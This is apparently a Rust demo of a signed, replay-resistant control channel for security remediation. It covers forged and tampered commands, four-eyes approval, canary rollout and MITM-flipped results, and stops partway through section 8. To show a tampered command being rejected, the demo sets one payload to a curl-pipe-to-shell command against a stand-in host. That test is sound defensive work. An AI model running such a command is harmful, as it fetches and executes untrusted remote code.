//! Live functional demo of the Remediation Bridge. Runs a user-authored action
//! end to end — signed control commands through the P3a gates, canary + rollout
//! execution, and a REAL Findings-Engine re-score verifying the fix — plus a
//! forged-command rejection. It then demonstrates the P3b-4 **bidirectional signed
//! control channel**: the agent returns a signed `CommandResult` that a SEPARATE
//! server-side verifier authenticates on the return leg — accepting genuine
//! outcomes (even authentic rejections) and catching a tampered (MITM-flipped)
//! result. Finally it demonstrates the P3b-5 **replay-resistant session channel**:
//! a replayed COMMAND caught by the agent's `ReplayGuard`, a replayed RESULT caught
//! by the issuer's `ResultCorrelator`, and the drop-and-substitute attack (drop a
//! genuine Rejected, re-inject a captured earlier Applied) refused. Finally it runs
//! the P3b-6 **control channel over a transport**: an `AgentControlLoop` and a
//! `ControlPlaneClient` exchange a signed command and its signed result OVER THE WIRE
//! across an in-memory `DuplexTransport` — applied, acknowledged, and a replayed
//! command caught by the loop's guard on the wire. Finally it runs the P3b-8
//! **signed, gated execution over the channel**: the two EXECUTION commands (canary +
//! rollout) apply a user's fix to real targets and cross the SAME
//! authn -> freshness -> authz -> replay gate as authoring — the full lifecycle
//! (Draft -> dry-run -> Submit -> Approve -> Canary -> Rollout) is driven entirely by
//! signed commands over the wire and really applies targets, while a forged canary and
//! an unauthorized (Approver-signed) canary are both REJECTED with the executor never
//! run. Finally it demonstrates P3b-9 **scheduled execution — change-window alignment**:
//! driven by a deterministic `FakeClock` (no wall clock), an approved, signed canary is
//! SCHEDULED for a window and fires ONLY inside it (`serve_one` enqueues; `tick` releases);
//! a second scheduled canary is ABORTED (kill switch) before its window and never fires; a
//! third's window EXPIRES and it never fires — proving changes align to a change window
//! WITHOUT auto-patching (a human still authors + approves + schedules every fire).
//! Finally it demonstrates P3b-10 **signing-key rotation & revocation**: signing keys and
//! trust sets load from ops-provisioned FILES (never source) — an operator signer from a
//! private-key file + a trust store from a directory (`from_key_file` / `load_trust_dir`);
//! a ROTATION trusts the new key BEFORE retiring the old (an overlap window drops no
//! in-flight command), then retires the old key so its signatures are rejected while the
//! new key still verifies; and a compromised key is REVOKED, rejecting its signatures
//! immediately — all fail-closed + verify_strict. Finally it demonstrates P3b-12 **config
//! hot-reload** on a RUNNING agent: trust reloads from ops files with NO restart — revoking
//! alice's signing key from the trust dir + a `reload_from_dir` makes the SAME command she
//! signed verify FALSE on the next command, while a bad reload (missing dir) is a fail-safe
//! no-op that leaves her still trusted.
//! Prints the audit trail. This is the observable functional checkpoint for the
//! remediation vertical (run it; read the output).
use torda_ingest::verify::{CurrentState, EngineVerifier};
use torda_ocsf::OcsfEnvelope;
use torda_remediation::action::*;
use torda_remediation::audit::{Outcome, VecAuditSink};
use torda_remediation::bridge::*;
use torda_remediation::control::*;
use torda_transport::DuplexTransport;

fn signed(
    signer: &torda_control_plane::CommandSigner,
    action_id: &str,
    kind: CommandKind,
    actor: &str,
) -> ControlCommand {
    let mut c = ControlCommand {
        action_id: action_id.into(),
        kind,
        actor: actor.into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    signer.sign(&mut c);
    c
}

#[derive(Default)]
struct DemoExec {
    applied: std::cell::RefCell<Vec<String>>,
    rolled_back: std::cell::RefCell<Vec<String>>,
}
impl Executor for DemoExec {
    fn preview(&self, a: &RemediationAction) -> String {
        format!("would run `{}`", a.payload)
    }
    fn apply(&mut self, _a: &RemediationAction, t: &str) -> anyhow::Result<()> {
        self.applied.borrow_mut().push(t.into());
        Ok(())
    }
    fn rollback(&mut self, _a: &RemediationAction, t: &str) -> anyhow::Result<()> {
        self.rolled_back.borrow_mut().push(t.into());
        Ok(())
    }
}

/// A shared applied-target log: one handle lives inside the loop's boxed executor (below), the
/// other stays in `main` so section [8] can read exactly what the gated wire path applied — or,
/// for the "nothing executes" cases, prove it applied NOTHING. `Rc<RefCell<_>>` because the loop
/// OWNS its executor yet the demo still needs a shared handle to observe it (single-threaded).
#[derive(Clone, Default)]
struct SharedLog(std::rc::Rc<std::cell::RefCell<Vec<String>>>);
impl SharedLog {
    fn list(&self) -> Vec<String> {
        self.0.borrow().clone()
    }
    fn is_empty(&self) -> bool {
        self.0.borrow().is_empty()
    }
}

/// A stub executor recording every applied target through a shared [`SharedLog`], so section [8]
/// can prove whether the gated wire path ever reached the executor (mirrors the channel vectors).
struct LoggingExec {
    applied: SharedLog,
}
impl Executor for LoggingExec {
    fn preview(&self, _a: &RemediationAction) -> String {
        String::new()
    }
    fn apply(&mut self, _a: &RemediationAction, t: &str) -> anyhow::Result<()> {
        self.applied.0.borrow_mut().push(t.into());
        Ok(())
    }
    fn rollback(&mut self, _a: &RemediationAction, _t: &str) -> anyhow::Result<()> {
        Ok(())
    }
}

/// Drive `a` straight to Approved on the bridge (draft -> dry_run -> submit -> approve) with
/// four-eyes (alice authors/submits, bob approves). Used by section [8]'s execution-gate cases so
/// each focuses purely on how the EXECUTION frame (Canary) is gated over the wire.
fn to_approved(b: &mut Bridge<VecAuditSink>, a: RemediationAction) {
    struct Preview;
    impl Executor for Preview {
        fn preview(&self, _a: &RemediationAction) -> String {
            String::new()
        }
        fn apply(&mut self, _a: &RemediationAction, _t: &str) -> anyhow::Result<()> {
            Ok(())
        }
        fn rollback(&mut self, _a: &RemediationAction, _t: &str) -> anyhow::Result<()> {
            Ok(())
        }
    }
    let id = a.id.clone();
    b.draft(a, "alice").unwrap();
    b.dry_run(&id, &Preview, "alice").unwrap();
    b.submit_for_approval(&id, "alice").unwrap();
    b.approve(&id, "bob").unwrap(); // four-eyes: a DIFFERENT actor approves
}

/// A 3-target remediation action (canary cohort 1) at `id`. The `FixedVerifier` in the loop
/// promotes/closes it regardless of the finding ids, so it is self-contained.
fn exec_action(id: &str) -> RemediationAction {
    let mut a = action();
    a.id = id.into();
    a.targets = AssetSelector {
        asset_ids: vec!["host-1".into(), "host-2".into(), "host-3".into()],
    };
    a.canary = CanarySpec {
        cohort_size: 1,
        failure_threshold: 0.0,
    };
    a
}

/// Drive `action_id` to Approved ENTIRELY over the wire (four-eyes: alice=Operator authors +
/// submits, a DISTINCT `approver`=bob approves — every stage a signed frame through the loop's
/// authn -> freshness -> authz gate). Used by section [9] so each scheduling scenario starts from a
/// genuinely-approved action reached the same way [8] does, just factored out. The `clock` is
/// passed to `serve_one` only because the signature demands it; lifecycle frames never read it.
#[allow(clippy::too_many_arguments)]
fn approve_over_wire(
    client: &mut torda_control_server::ControlPlaneClient,
    ct: &mut DuplexTransport,
    at: &mut DuplexTransport,
    lp: &mut torda_control_plane::AgentControlLoop<'_>,
    bridge: &mut Bridge<VecAuditSink>,
    session: &str,
    action_id: &str,
    approver: &torda_control_plane::CommandSigner,
    clock: &dyn Clock,
) {
    let op_cmd = |kind: CommandKind, seq: u64| ControlCommand {
        action_id: action_id.into(),
        kind,
        actor: "alice".into(),
        session: session.into(),
        seq,
        schedule: None,
        signature: String::new(),
    };
    // seq 1: operator signs Draft.
    let mut draft = op_cmd(CommandKind::Draft(Box::new(exec_action(action_id))), 1);
    client.sign(&mut draft);
    client.send_command(ct, draft).unwrap();
    assert!(
        lp.serve_one(at, bridge, clock).unwrap(),
        "loop served the Draft frame"
    );
    assert_eq!(
        client.await_result(ct).unwrap().expect("draft ack").outcome,
        torda_control_plane::CommandOutcome::Applied
    );
    // dry_run is a LOCAL read-only preview (not a wire command); it moves Drafted -> DryRun, the
    // state Submit requires — exactly as section [8] and the bridge state machine demand.
    bridge
        .dry_run(action_id, &DemoExec::default(), "alice")
        .unwrap();
    // seq 2: operator signs Submit.
    let mut submit = op_cmd(CommandKind::Submit, 2);
    client.sign(&mut submit);
    client.send_command(ct, submit).unwrap();
    assert!(
        lp.serve_one(at, bridge, clock).unwrap(),
        "loop served the Submit frame"
    );
    assert_eq!(
        client
            .await_result(ct)
            .unwrap()
            .expect("submit ack")
            .outcome,
        torda_control_plane::CommandOutcome::Applied
    );
    // seq 3: a DISTINCT approver signs Approve with their OWN key — four-eyes on the wire.
    let mut approve = ControlCommand {
        action_id: action_id.into(),
        kind: CommandKind::Approve,
        actor: approver.actor.clone(),
        session: session.into(),
        seq: 3,
        schedule: None,
        signature: String::new(),
    };
    approver.sign(&mut approve);
    client.send_command(ct, approve).unwrap();
    assert!(
        lp.serve_one(at, bridge, clock).unwrap(),
        "loop served the Approve frame"
    );
    assert_eq!(
        client
            .await_result(ct)
            .unwrap()
            .expect("approve ack")
            .outcome,
        torda_control_plane::CommandOutcome::Applied
    );
    assert_eq!(
        bridge.state(action_id),
        Some(ActionState::Approved),
        "four-eyes approval reached Approved over the wire"
    );
}

fn sbom(host: &str, name: &str, version: &str) -> OcsfEnvelope {
    OcsfEnvelope::new(
        torda_ocsf::class::SOFTWARE_INVENTORY_INFO,
        "Software Inventory Info",
        torda_ocsf::Metadata {
            product: "torda".into(),
            version: "0".into(),
            tenant_id: "t".into(),
        },
        torda_ocsf::Device {
            hostname: host.into(),
            os: "Test".into(),
            os_version: "1".into(),
        },
        serde_json::json!({ "sbom": { "components": [{"name": name, "version": version, "source": "dpkg"}], "component_count": 1 } }),
    )
}
// Post-fix state: openssl upgraded to 3.0.14 -> the CVE finding is gone.
struct FixedState;
impl CurrentState for FixedState {
    fn envelopes(&self, _a: &str) -> Vec<OcsfEnvelope> {
        vec![sbom("host-1", "openssl", "3.0.14")]
    }
}

/// A stub re-score verifier for the wire loop's held orchestrator. Section [7] drives only
/// a lifecycle Draft over the wire, so this verifier (like the loop's executor) is never
/// consulted there; it exists only to satisfy the loop's owned-orchestrator fields.
struct FixedVerifier;
impl Verifier for FixedVerifier {
    fn verify(&self, _a: &RemediationAction, _t: &[String]) -> VerifyOutcome {
        VerifyOutcome::Fixed
    }
}

fn action() -> RemediationAction {
    RemediationAction {
        id: "fix-openssl".into(),
        name: "upgrade openssl to 3.0.14".into(),
        method: Method::PackageMgr,
        payload: "apt-get install -y openssl=3.0.14".into(),
        targets: AssetSelector {
            asset_ids: vec!["host-1".into()],
        },
        requires_approval: true,
        dry_run_supported: true,
        rollback: Some("apt-get install -y openssl=3.0.2".into()),
        verify: VerifySpec {
            finding_ids: vec!["host-1|CVE-2022-3602|openssl|dpkg".into()],
        },
        canary: CanarySpec {
            cohort_size: 1,
            failure_threshold: 0.0,
        },
    }
}

fn main() {
    let alice = torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]);
    let bob = torda_control_plane::CommandSigner::from_seed("bob", [4u8; 32]);
    let mut verifier = torda_control_plane::Ed25519Verifier::new();
    verifier.trust("alice", alice.verifying_key());
    verifier.trust("bob", bob.verifying_key());

    let mut policy = torda_remediation::control::RolePolicy::new();
    policy.assign("alice", torda_remediation::control::Role::Operator);
    policy.assign("bob", torda_remediation::control::Role::Approver);

    let mut b = Bridge::new(VecAuditSink::default());
    let mut ex = DemoExec::default();
    let engine_verifier = EngineVerifier::new(&FixedState);

    println!(
        "== Remediation Bridge — live functional demo (real ed25519 + least-privilege authz) ==\n"
    );

    println!("[1] FORGED command (attacker tries to draft with a bad signature):");
    let forged = ControlCommand {
        action_id: "fix-openssl".into(),
        kind: CommandKind::Draft(Box::new(action())),
        actor: "attacker".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: "forged".into(),
    };
    match dispatch(&mut b, forged, &verifier, &policy) {
        Ok(()) => println!("    UNEXPECTED: forged command accepted!"),
        Err(e) => println!("    rejected at the signature gate: {e}"),
    }
    println!(
        "    action state: {:?}  (never drafted)\n",
        b.state("fix-openssl")
    );

    println!("[1b] TAMPERED command (attacker swaps the script AFTER a valid signature):");
    let mut benign = action();
    benign.payload = "apt-get install -y openssl=3.0.14".into();
    let mut tampered = ControlCommand {
        action_id: "fix-openssl".into(),
        kind: CommandKind::Draft(Box::new(benign)),
        actor: "alice".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    alice.sign(&mut tampered);
    if let CommandKind::Draft(a) = &mut tampered.kind {
        a.payload = "curl evil.sh | sh".into();
    }
    match dispatch(&mut b, tampered, &verifier, &policy) {
        Ok(()) => println!("    UNEXPECTED: tampered command accepted!"),
        Err(e) => println!("    rejected — the signature binds the full command body: {e}"),
    }
    println!(
        "    action state: {:?}  (never drafted)\n",
        b.state("fix-openssl")
    );

    println!("[2] Alice (operator) authors the action (draft -> dry-run -> submit):");
    dispatch(
        &mut b,
        signed(
            &alice,
            "fix-openssl",
            CommandKind::Draft(Box::new(action())),
            "alice",
        ),
        &verifier,
        &policy,
    )
    .unwrap();
    let preview = b.dry_run("fix-openssl", &ex, "alice").unwrap();
    println!("    dry-run preview: {}", preview.preview);
    dispatch(
        &mut b,
        signed(&alice, "fix-openssl", CommandKind::Submit, "alice"),
        &verifier,
        &policy,
    )
    .unwrap();
    println!("    state after submit: {:?}\n", b.state("fix-openssl"));

    println!("[2b] Separation of duties (four-eyes):");
    // Alice (operator) authored + submitted; she may NOT approve her own action.
    let mut self_approve = ControlCommand {
        action_id: "fix-openssl".into(),
        kind: CommandKind::Approve,
        actor: "alice".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    alice.sign(&mut self_approve);
    match dispatch(&mut b, self_approve, &verifier, &policy) {
        Ok(()) => println!("    UNEXPECTED: operator approved their own action!"),
        Err(e) => println!("    operator self-approval refused: {e}"),
    }
    println!(
        "    state after refused self-approval: {:?}",
        b.state("fix-openssl")
    );
    // Bob (approver) approves.
    let mut approve = ControlCommand {
        action_id: "fix-openssl".into(),
        kind: CommandKind::Approve,
        actor: "bob".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    bob.sign(&mut approve);
    dispatch(&mut b, approve, &verifier, &policy).unwrap();
    println!(
        "    approver approved: state {:?}\n",
        b.state("fix-openssl")
    );

    println!("[3] Execute + verify (canary -> rollout, re-scored by the REAL engine):");
    let canary = b
        .run_canary("fix-openssl", &mut ex, &engine_verifier, "secops")
        .unwrap();
    println!("    canary: {:?}", canary);
    let rollout = b
        .run_rollout("fix-openssl", &mut ex, &engine_verifier, "secops")
        .unwrap();
    println!("    rollout: {:?}", rollout);
    println!(
        "    FINAL state: {:?}   applied={:?}\n",
        b.state("fix-openssl"),
        ex.applied.borrow()
    );

    println!("[4] Audit trail (every gate + step, actor + outcome):");
    for e in &b.audit().events {
        let mark = if e.outcome == Outcome::Rejected {
            "REJECTED"
        } else if e.outcome == Outcome::Failed {
            "FAILED"
        } else {
            "ok"
        };
        println!(
            "    #{:<2} {:<8} {:>10?} -> {:<10?} by {:<10} | {}",
            e.seq, mark, e.from, e.to, e.actor, e.detail
        );
    }
    assert_eq!(
        b.state("fix-openssl"),
        Some(ActionState::Closed),
        "the verified fix closed the action"
    );

    println!("\n[5] Bidirectional signed results (agent -> server return leg):");
    // An agent identity: a DISTINCT key from any command issuer. The agent signs
    // every result it returns so the issuer can authenticate the acknowledgment.
    let agent = torda_control_plane::CommandSigner::from_seed("agent-1", [42u8; 32]);
    // The agent-side handler reuses the command `verifier` (trusts alice/bob =
    // operators) + `policy` (RolePolicy), and signs results with the agent key.
    let handler = torda_control_plane::AgentControlHandler::new(&verifier, &policy, &agent);
    // A SEPARATE server-side verifier that trusts ONLY the agent's key — the
    // return-leg authentication, distinct from the command-direction trust above.
    let mut server = torda_control_plane::Ed25519Verifier::new();
    server.trust("agent-1", agent.verifying_key());
    // A fresh bridge + a fresh action id keep this section self-contained (no
    // collision with the [1]-[4] "fix-openssl" lifecycle state).
    let mut b2 = Bridge::new(VecAuditSink::default());
    let mut a2 = action();
    a2.id = "fix-openssl-2".into();

    // (a) Authorized command -> Applied, and the server verifies the agent's result.
    let cmd = signed(
        &alice,
        "fix-openssl-2",
        CommandKind::Draft(Box::new(a2)),
        "alice",
    );
    let applied = handler.handle(&mut b2, cmd);
    println!("    (a) alice (operator) signs an authorized Draft:");
    println!(
        "        result.outcome: {:?}   detail: {}",
        applied.outcome, applied.detail
    );
    let applied_ok = server.verify(&applied.payload(), &applied.signature, &applied.agent);
    println!("        server verified agent result: {applied_ok}");
    assert_eq!(
        applied.outcome,
        torda_control_plane::CommandOutcome::Applied,
        "authorized command applied"
    );
    assert!(
        applied_ok,
        "server authenticates the agent-signed Applied result"
    );

    // (b) Forged command -> authentic Rejected. The command is refused, yet the
    // RESULT is still genuinely agent-signed, so the issuer can TRUST the rejection.
    let forged = ControlCommand {
        action_id: "fix-openssl-2".into(),
        kind: CommandKind::Submit,
        actor: "attacker".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: "forged".into(),
    };
    let rejected = handler.handle(&mut b2, forged);
    println!("    (b) forged command (untrusted signature):");
    println!(
        "        outcome: {:?} (the command was refused)",
        rejected.outcome
    );
    let rejected_ok = server.verify(&rejected.payload(), &rejected.signature, &rejected.agent);
    println!("        server verified the REJECTION is authentic: {rejected_ok}");
    assert_eq!(
        rejected.outcome,
        torda_control_plane::CommandOutcome::Rejected,
        "forged command refused"
    );
    assert!(
        rejected_ok,
        "the rejection is an authentic, agent-signed acknowledgment"
    );

    // (c) Tampered result — the dangerous MITM: hide a refusal by flipping the
    // genuine Rejected result to Applied WITHOUT re-signing. The signature binds
    // the canonical payload, so the server's real ed25519 check must REJECT it.
    println!("    (c) MITM flips the genuine Rejected result to Applied (no re-sign):");
    // Re-confirm the genuine result verifies TRUE first, so the "false" is meaningful.
    assert!(
        server.verify(&rejected.payload(), &rejected.signature, &rejected.agent),
        "genuine result verifies"
    );
    let mut tampered = rejected.clone();
    tampered.outcome = torda_control_plane::CommandOutcome::Applied;
    let tampered_ok = server.verify(&tampered.payload(), &tampered.signature, &tampered.agent);
    println!("        server verified tampered (Rejected->Applied) result: {tampered_ok}  <- MITM caught");
    assert!(
        !tampered_ok,
        "a tampered result must fail real ed25519 verification"
    );

    // The control channel (commands + results) is separate from OCSF telemetry:
    // CommandResult is not an OcsfEnvelope and no telemetry is emitted on this path.
    println!(
        "    note: control results are NOT OCSF telemetry — no envelope is emitted on this path."
    );

    println!("\n[6] Replay resistance (P3b-5 — command guard + result correlator):");
    // Self-contained: a FRESH bridge, its own ReplayGuard (command side) and its own
    // ResultCorrelator (result side). The guard admits seq strictly greater than 0
    // (i.e. seq >= 1) on the opened session "sess-A". These guards are independent of
    // sections [1]-[5]. The result side reuses the agent identity + server verifier
    // pattern from [5] (agent `agent`, `handler`, and the `server` return-leg verifier).
    let mut guard = ReplayGuard::new();
    guard.open_session("sess-A", 0); // admits seq >= 1
    let mut b3 = Bridge::new(VecAuditSink::default());
    let mut corr = torda_control_server::ResultCorrelator::new();

    // Deterministically (re)build a genuine alice-signed Draft on ("sess-A", seq).
    // Rebuilding with identical inputs reproduces the identical ed25519 signature —
    // that is exactly how the "same command" is replayed below.
    let signed_draft_on = |action_id: &str, seq: u64| -> ControlCommand {
        let mut a = action();
        a.id = action_id.into();
        let mut c = ControlCommand {
            action_id: action_id.into(),
            kind: CommandKind::Draft(Box::new(a)),
            actor: "alice".into(),
            session: "sess-A".into(),
            seq,
            schedule: None,
            signature: String::new(),
        };
        alice.sign(&mut c);
        c
    };

    // (1) COMMAND REPLAY — caught by the agent's ReplayGuard.
    dispatch_fresh(
        &mut b3,
        &mut guard,
        signed_draft_on("fix-openssl-3", 1),
        &verifier,
        &policy,
    )
    .unwrap();
    println!("    (1) command replay:");
    println!(
        "        seq=1 command applied: state {:?}",
        b3.state("fix-openssl-3")
    );
    let state_before_replay = b3.state("fix-openssl-3");
    let replayed = dispatch_fresh(
        &mut b3,
        &mut guard,
        signed_draft_on("fix-openssl-3", 1),
        &verifier,
        &policy,
    );
    match &replayed {
        Ok(()) => println!("        UNEXPECTED: replayed command accepted!"),
        Err(e) => println!("        replay of seq=1 command -> rejected: {e}  <- replay caught"),
    }
    assert!(
        replayed.is_err(),
        "a replayed (session, seq) command is rejected by the ReplayGuard"
    );
    assert_eq!(
        b3.state("fix-openssl-3"),
        state_before_replay,
        "the replayed command did not change bridge state"
    );

    // (2) RESULT REPLAY — caught by the issuer's ResultCorrelator.
    // The issuer records ("sess-A", 2) as outstanding, the agent produces a genuine
    // signed Applied result echoing that (session, seq); accepting it CONSUMES the entry.
    corr.issue("sess-A", 2);
    let mut cmd2 = ControlCommand {
        action_id: "fix-openssl-4".into(),
        kind: CommandKind::Draft(Box::new({
            let mut a = action();
            a.id = "fix-openssl-4".into();
            a
        })),
        actor: "alice".into(),
        session: "sess-A".into(),
        seq: 2,
        schedule: None,
        signature: String::new(),
    };
    alice.sign(&mut cmd2);
    let result2 = handler.handle(&mut b3, cmd2);
    assert_eq!(
        result2.outcome,
        torda_control_plane::CommandOutcome::Applied,
        "genuine seq=2 command applied"
    );
    let accepted_first = corr.accept(&result2, &server);
    let accepted_replay = corr.accept(&result2, &server);
    println!("    (2) result replay:");
    println!("        issuer accepted genuine result: {accepted_first}");
    println!("        replay of the same result -> accepted={accepted_replay}  <- replay caught");
    assert!(
        accepted_first,
        "the first genuine, outstanding, signed result is accepted"
    );
    assert!(
        !accepted_replay,
        "the SAME result again is rejected — its (session, seq) was already consumed"
    );

    // (3) DROP-AND-SUBSTITUTE (the P3b-4 attack) — caught by the ResultCorrelator.
    // Round 1: issue seq=3; the agent returns a genuine Applied; the issuer accepts +
    // CONSUMES it (the attacker captures this result off the wire).
    corr.issue("sess-A", 3);
    let mut cmd3 = ControlCommand {
        action_id: "fix-openssl-5".into(),
        kind: CommandKind::Draft(Box::new({
            let mut a = action();
            a.id = "fix-openssl-5".into();
            a
        })),
        actor: "alice".into(),
        session: "sess-A".into(),
        seq: 3,
        schedule: None,
        signature: String::new(),
    };
    alice.sign(&mut cmd3);
    let captured_seq3_applied = handler.handle(&mut b3, cmd3);
    assert_eq!(
        captured_seq3_applied.outcome,
        torda_control_plane::CommandOutcome::Applied,
        "seq=3 command applied"
    );
    assert!(
        corr.accept(&captured_seq3_applied, &server),
        "seq=3 Applied accepted and consumed"
    );
    // Round 2: issue seq=5 (a DIFFERENT command); the agent genuinely returns a Rejected
    // result (a forged/untrusted command it refused) for this outstanding request.
    corr.issue("sess-A", 5);
    let forged_seq5 = ControlCommand {
        action_id: "fix-openssl-6".into(),
        kind: CommandKind::Submit,
        actor: "attacker".into(),
        session: "sess-A".into(),
        seq: 5,
        schedule: None,
        signature: "forged".into(),
    };
    let rejected_seq5 = handler.handle(&mut b3, forged_seq5);
    assert_eq!(
        rejected_seq5.outcome,
        torda_control_plane::CommandOutcome::Rejected,
        "forged seq=5 command refused (authentic rejection)"
    );
    // Attack: the MITM DROPS the seq=5 Rejected and RE-INJECTS the captured seq=3 Applied,
    // hoping the issuer records "applied" for seq=5. seq=3 is already consumed -> refused.
    let mitm_accepted = corr.accept(&captured_seq3_applied, &server);
    println!("    (3) drop-and-substitute:");
    println!("        drop-Rejected + inject captured seq=3 Applied -> accepted={mitm_accepted}  <- MITM caught");
    assert!(
        !mitm_accepted,
        "the stale seq=3 Applied cannot answer the outstanding seq=5"
    );
    // seq=5 is still outstanding-and-unanswered: the GENUINE seq=5 result still lands.
    assert!(
        corr.accept(&rejected_seq5, &server),
        "the genuine seq=5 result is still accepted — seq=5 stayed outstanding"
    );

    println!("    note: these replay guards are application-layer and transport-independent — they hold even before mTLS lands.");

    println!("\n[7] Control channel over a transport (agent loop <-> issuer client):");
    // Self-contained: a FRESH bridge (b4), its own action ids, and a paired in-memory
    // DuplexTransport. The agent side runs an AgentControlLoop (the enforced,
    // replay-guarded wire entry point: handle_fresh -> dispatch_fresh only); the issuer
    // side runs a ControlPlaneClient that signs commands and accepts only correlated,
    // agent-signed results. A control SESSION scopes the freshness token on the wire.
    let session = torda_control_server::establish_session("host-1", 1);
    println!("    established control session: {session}  (stub id — the real mTLS-bound handshake is P3b-7)");

    let mut b4 = Bridge::new(VecAuditSink::default());
    // Agent side: reuse the [5] agent identity + the command `verifier` (trusts
    // alice/bob) + `policy`. The loop opens `session` admitting seq >= 1 (from = 0).
    let handler4 = torda_control_plane::AgentControlHandler::new(&verifier, &policy, &agent);
    // The loop holds its own orchestrator (executor + engine verifier). This section drives
    // only a lifecycle Draft, so neither is consulted here; execution-over-the-wire routing
    // is covered by the control-plane golden vectors.
    let mut agent_loop = torda_control_plane::AgentControlLoop::with_session(
        handler4,
        &session,
        0,
        Box::new(DemoExec::default()),
        Box::new(FixedVerifier),
    );
    // Issuer side: the client needs its OWN CommandSigner (taken by value). Reuse alice's
    // SEED so the agent's verifier still trusts the key under the actor name "alice"
    // (alice is an Operator, so a Draft is authorized).
    let client_signer = torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]);
    let mut server4 = torda_control_plane::Ed25519Verifier::new();
    server4.trust("agent-1", agent.verifying_key()); // return-leg trust for the agent key
    let mut client = torda_control_server::ControlPlaneClient::new(client_signer, server4);
    let (mut client_t, mut agent_t) = DuplexTransport::pair();

    // Build a benign, authorized Draft on (session, seq). UNSIGNED — signed by the
    // client just before sending (below). This does NOT borrow `client`, so it can
    // coexist with the mutable `send_command` calls that follow.
    let unsigned_wire_cmd = |seq: u64| -> ControlCommand {
        let mut a = action();
        a.id = "fix-openssl-7".into();
        ControlCommand {
            action_id: "fix-openssl-7".into(),
            kind: CommandKind::Draft(Box::new(a)),
            actor: "alice".into(),
            session: session.clone(),
            seq,
            schedule: None,
            signature: String::new(),
        }
    };

    // (1) A command travels over the wire, the agent applies it, and the signed result
    //     comes back and is accepted by the issuer's correlator.
    let mut cmd1 = unsigned_wire_cmd(1);
    client.sign(&mut cmd1); // issuer signs with alice's key (ed25519, deterministic)
    client.send_command(&mut client_t, cmd1).unwrap();
    let served = agent_loop
        .serve_one(&mut agent_t, &mut b4, &SystemClock)
        .unwrap();
    let result = client.await_result(&mut client_t).unwrap();
    println!(
        "    (1) command sent over the wire -> agent applied -> result: {:?}",
        result.as_ref().map(|r| &r.outcome)
    );
    println!(
        "        bridge state after the wire round-trip: {:?}",
        b4.state("fix-openssl-7")
    );
    assert!(
        served,
        "the agent loop served exactly one command frame off the wire"
    );
    let result = result.expect("a genuine, correlated agent result returns over the wire");
    assert_eq!(
        result.outcome,
        torda_control_plane::CommandOutcome::Applied,
        "the wire command was applied by the agent"
    );
    assert_eq!(
        b4.state("fix-openssl-7"),
        Some(ActionState::Drafted),
        "the bridge advanced from the wire command"
    );
    let state_after_wire_apply = b4.state("fix-openssl-7");

    // (2) A replay of the SAME seq=1 command over the wire is caught by the loop's guard.
    //     ed25519 is deterministic, so rebuilding it identically reproduces the exact bytes.
    let mut cmd_replay = unsigned_wire_cmd(1);
    client.sign(&mut cmd_replay);
    client.send_command(&mut client_t, cmd_replay).unwrap();
    let served_replay = agent_loop
        .serve_one(&mut agent_t, &mut b4, &SystemClock)
        .unwrap();
    let replay_result = client.await_result(&mut client_t).unwrap();
    println!(
        "    (2) replay of the seq=1 command over the wire -> result: {:?}  <- guard caught",
        replay_result.as_ref().map(|r| &r.outcome)
    );
    println!(
        "        bridge state unchanged by the replay: {:?}",
        b4.state("fix-openssl-7")
    );
    assert!(
        served_replay,
        "the agent loop served the replayed frame off the wire"
    );
    let replay_result =
        replay_result.expect("the replay still yields an authentic, correlated rejection");
    assert_eq!(
        replay_result.outcome,
        torda_control_plane::CommandOutcome::Rejected,
        "the loop's replay guard rejected the stale seq over the wire"
    );
    assert_eq!(
        b4.state("fix-openssl-7"),
        state_after_wire_apply,
        "the replayed command did NOT change bridge state"
    );

    println!("    note: the transport is a swappable seam — this runs over an in-memory DuplexTransport today; the mTLS socket (with physical control/telemetry separation) lands in P3b-7 without changing the loop or any module.");

    println!("\n[8] Signed, gated execution over the channel (P3b-8 — canary + rollout ride the same signed wire):");
    // Self-contained: fresh bridges, fresh DuplexTransport pairs, fresh AgentControlLoops each
    // holding a `LoggingExec` (shared applied-log) + `FixedVerifier`, and fresh ControlPlaneClients.
    // Reuses the [1] command `verifier` (trusts alice/bob) + `policy` (alice=Operator, bob=Approver)
    // and the [5] `agent` identity. EXECUTION commands (Canary/Rollout) now cross the SAME
    // authn -> freshness -> authz -> replay gate as authoring — proven over the wire.
    let session8 = torda_control_server::establish_session("host-1", 8);
    println!("    established control session: {session8}");

    // -- (1) Full lifecycle INCLUDING execution, every stage signed over the wire ------------------
    let applied_log = SharedLog::default();
    let mut b8 = Bridge::new(VecAuditSink::default());
    let handler8 = torda_control_plane::AgentControlHandler::new(&verifier, &policy, &agent);
    let mut loop8 = torda_control_plane::AgentControlLoop::with_session(
        handler8,
        &session8,
        0,
        Box::new(LoggingExec {
            applied: applied_log.clone(),
        }),
        Box::new(FixedVerifier),
    );
    let mut server8 = torda_control_plane::Ed25519Verifier::new();
    server8.trust("agent-1", agent.verifying_key());
    // The client signs with alice's key (Operator authors + executes); a distinct bob key approves.
    let mut client8 = torda_control_server::ControlPlaneClient::new(
        torda_control_plane::CommandSigner::from_seed("alice", [3u8; 32]),
        server8,
    );
    let bob8 = torda_control_plane::CommandSigner::from_seed("bob", [4u8; 32]);
    let (mut c8, mut a8) = DuplexTransport::pair();
    // A wire command for action "fix-openssl-8" on (session8, seq), UNSIGNED (signed just below).
    let wire8 = |kind: CommandKind, actor: &str, seq: u64| -> ControlCommand {
        ControlCommand {
            action_id: "fix-openssl-8".into(),
            kind,
            actor: actor.into(),
            session: session8.clone(),
            seq,
            schedule: None,
            signature: String::new(),
        }
    };
    // Runs one signed operator step over the wire and returns the outcome+detail.
    macro_rules! op_step {
        ($kind:expr, $seq:expr) => {{
            let mut cmd = wire8($kind, "alice", $seq);
            client8.sign(&mut cmd);
            client8.send_command(&mut c8, cmd).unwrap();
            assert!(
                loop8.serve_one(&mut a8, &mut b8, &SystemClock).unwrap(),
                "loop served one frame"
            );
            client8
                .await_result(&mut c8)
                .unwrap()
                .expect("a correlated, agent-signed result")
        }};
    }

